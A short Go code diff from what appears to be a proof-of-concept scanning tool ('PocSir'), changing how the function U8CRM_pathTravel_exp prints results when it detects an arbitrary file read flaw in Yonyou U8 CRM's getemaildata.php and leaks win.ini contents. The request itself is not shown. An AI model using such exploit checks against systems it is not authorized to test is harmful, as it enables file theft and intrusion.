@@ -3,7 +3,6 @@ package poc
 import (
 	"PocSir/config"
 	"crypto/tls"
-	"github.com/fatih/color"
 	"io"
 	"net/http"
 )
@@ -33,8 +32,8 @@ func U8CRM_pathTravel_exp(target string) {
 		config.ErrMsg.Printf("[-]%v\n", err)
 	}
 	if resp.StatusCode == 200 {
-		color.Green("[+]存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞")
-		color.Cyan("[+]win.ini内容: %s\n", string(read))
+		config.Right.Println("[+]存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞")
+		config.TextPut.Printf("[+]win.ini内容: %s\n", string(read))
 	} else {
 		config.ErrMsg.Printf("[-]不存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞\n")
 	}
